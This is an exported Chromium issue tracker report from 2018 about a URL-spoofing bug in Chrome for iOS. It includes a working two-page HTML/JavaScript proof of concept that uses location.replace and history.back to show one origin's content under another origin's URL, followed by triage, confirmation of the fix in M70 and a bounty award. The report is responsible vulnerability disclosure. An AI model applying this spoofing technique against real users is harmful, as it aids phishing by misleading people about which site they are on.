# Security: Chrome for iOS URL spoofing using location.replace and history.back

| Field | Value |
|-------|-------|
| **Issue ID** | [40091647](https://issues.chromium.org/issues/40091647) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | vl...@gmail.com |
| **Assignee** | eu...@chromium.org |
| **Created** | 2018-06-14 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Attacker could spoof URL using location.replace() behavior.  

Seems related to <https://bugs.chromium.org/p/chromium/issues/detail?id=805900>

1. Page from victim.com calls location.replace(evil.com)
2. Page on evil.com calls history.back()
3. At this point, we've got page with content from evil.com, but URL in address bar is vistim.com

Running PoC in debug build, leads to the page on spoofed url alerts "embedded page...".  

As far as I understood, location.replace(<nextPage>) creates a kind of "intermediate" window on the replaced page, which has <nextPage> as top frame. This "top frame" doesn't have any restriction on embedded resource, so X-FRAME-OPTIONS doesn't work.

Additionally, no warnings about self-signed cert on victim.com shown in the spoofed page's address bar.

**VERSION**  

Chrome Version: 67.0.3396.69 stable + 69 dev debug  

Operating System: iOS 11.4 (15f79), real device

**REPRODUCTION CASE**

1. Start 2 local servers (localhost:3000 for "3000" folder and localhost:5000 for "5000" folder)
2. Open localhost:3000
3. Navigation to localhost:5000 initiated
4. Page alerts 'I am going back ... 5000' and calls history.back()
5. location in address bar = localhost:3000, "real" location = localhost:5000

evil.com (localhost:5000)

```
<body>  
    <script>  
        if (document.cookie.includes('here=1')) {  
            document.cookie = "here=0";  
            alert('This is not localhost:3000, real location:' + location);  
        } else {  
            document.cookie = 'here=1';  
            alert('I am going .back(), real location' + location);  
            history.back();  
        }  
        document.write('<h1>' + location + '</h1>')  
    </script>  
    <a href="https://www.whatismyreferer.com/" /> What's my referrer?</a>  
</body>  

```

victim.com (localhost:3000)

```
<body>  
    <script>  
        window.onload = () => {  
            if (location.search === '') {  
                // looks like this block is required in most cases   
                // But it's also possible to spoof using location.replace only  
                // actually, this snippet was "stolen" from Chrome iOS tests   
                history.replaceState({}, 'reload', '?reload');  
                location.reload();  
            } else {  
                const host = '192.168.0.101' || 'localhost'  
                location.replace(`http://${host}:5000`)  
            }  
        }  
    </script>  
</body>  

```

Screencast attached.

## Attachments

- [video (3).mp4](attachments/video (3).mp4) (video/mp4, 831.7 KB)
- [spoof.zip](attachments/spoof.zip) (application/octet-stream, 1.2 KB)

## Timeline

### vl...@gmail.com (2018-06-14)

Link to screencast: https://spoof-cmbvxkarws.now.sh/video%20(3).mp4 

### wf...@chromium.org (2018-06-14)

eugene can you take a look at this please?

[Monorail components: UI>Browser>Navigation]

### eu...@chromium.org (2018-06-14)

Srikanth, could you please check if this bug is reproducible with slim-navigation-manager

### sr...@chromium.org (2018-06-14)

NOT able to reproduce this with #slim-naviagation-manager enabled.
Tested on 69 ToT, with the given html pages.
Since there is no live pages to test, I tested this on iOS11.4 Simulator.

### eu...@chromium.org (2018-06-14)

Will be fixed in M68 if we ship slim-naviagation-manager

### sh...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### eu...@chromium.org (2018-07-10)

slim-naviagation-manager was postponed to M69.

### eu...@chromium.org (2018-09-17)

Than you for reporting this bug. Is it possible to spoof URL scheme or hostname? Or this vulnerability only affects port?

### vl...@gmail.com (2018-09-17)

It was possible to spoof both scheme and hostname.

I was able to spoof even SSL lock, however, don't have a meaningful PoC to show.

### eu...@chromium.org (2018-09-17)

Thanks! I tested attached PoC with top of the tree and M70 branch. When I load localhost:5000, there is no client redirect to localhost:3000 and the page stays on localhost:5000. So I think this should be fixed in Chrome version 70.

### vl...@gmail.com (2018-09-17)

Confirm that it was fixed.

### eu...@chromium.org (2018-09-17)

Thanks a lot for checking this!

### vl...@gmail.com (2018-09-18)

Any CVE/bounty?

### eu...@chromium.org (2018-09-18)

This bug will go through reward panel.

### vl...@gmail.com (2018-09-18)

Thanks! 
I often saw CVE is issued before the fix. 
So I've asked about that because maybe the bug isn't valid for VRP or there are some iOS-specific restrictions. Thanks again!

### eu...@chromium.org (2018-09-18)

No worries, Vladimir. Thank you for the bug report.

### sh...@chromium.org (2018-09-18)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-09-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-09-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### vl...@gmail.com (2018-09-28)

Great, thanks!

Also, please, could someone check [1]?
That's an already resolved issue about AppleScript on macOS. 
However, nobody replied to my comment, but I think the provided info may be useful for Chrome, even if the impact of this issue is minor.

[1] - https://bugs.chromium.org/p/chromium/issues/detail?id=850261#c_ts1537247459

### aw...@google.com (2018-09-28)

Most welcome,  vladimirmetnew@! A member of our finance team will be in touch to arrange payment.  Also, how would you like to be credited in our release notes?

As to [1], would you mind filing that as a new bug? It'll then get picked up by our sheriffs and can be triaged and tracked separately.  Cheers!

### aw...@chromium.org (2018-09-28)

[Empty comment from Monorail migration]

### vl...@gmail.com (2018-09-28)

I guess "Vladimir Metnew" sounds good for release notes)

Sure, I'll fill a new bug.

### aw...@google.com (2018-10-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-11-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-12-25)

This issue was migrated from crbug.com/chromium/852634?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091647)*
